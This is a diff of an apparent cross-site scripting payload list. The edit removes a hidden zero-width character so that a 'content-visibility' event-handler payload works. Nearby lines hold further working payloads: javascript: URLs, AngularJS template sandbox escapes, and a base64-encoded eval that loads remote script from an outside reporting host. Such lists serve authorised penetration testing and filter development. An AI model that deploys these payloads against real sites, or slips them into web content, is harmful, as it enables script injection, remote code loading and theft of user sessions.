@@ -151,7 +151,7 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
 {{0[a='constructor'][a]('alert(1)')()}}
 <00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
 '"()><img src="x"><a href="https://google.com">click</a>
-<input type=hidden oncontentvisibilityautostatechange​=alert(1) style=content-visibility:auto>
+<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
 {{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3Rlc3QtdGVzdCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsmIzYxOyYjNjE=\'))')()}}
 <​/script><iframe src=javascript​:alert()>
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
